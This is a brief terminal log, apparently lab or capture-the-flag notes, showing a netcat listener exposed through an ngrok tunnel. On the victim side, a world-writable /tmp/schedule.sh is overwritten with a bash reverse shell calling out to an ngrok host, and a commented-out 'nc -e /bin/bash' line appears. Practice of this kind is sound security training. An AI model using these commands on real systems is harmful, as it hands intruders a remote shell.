# Netcat without netcat

## attacker

┌──(winniethesuii㉿winniethesuii)-[~]
└─$ nc -lvp 4242

┌──(winniethesuii㉿winniethesuii)-[~]
└─$ ngrok tcp 4242

┌──(winniethesuii㉿winniethesuii)-[~]
└─$ ngrok tcp 4242

## victim

#nc -nv 127.0.0.1 10000 -e /bin/bash
noob@machine-xtnb90ekboqixng3erxw-c2068-7b6f4d596d-vzl2x:~$ ls -lart /tmp/schedule.sh
-rwxrwxrwx 1 noob noob 50 Jul 18  2022 /tmp/schedule.sh
noob@machine-xtnb90ekboqixng3erxw-c2068-7b6f4d596d-vzl2x:~$ ls
noob@machine-xtnb90ekboqixng3erxw-c2068-7b6f4d596d-vzl2x:~$ ls -lart /tmp/schedule.sh
-rwxrwxrwx 1 noob noob 50 Jul 18  2022 /tmp/schedule.sh
noob@machine-xtnb90ekboqixng3erxw-c2068-7b6f4d596d-vzl2x:~$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10142 0>&1' > /tmp/schedule.sh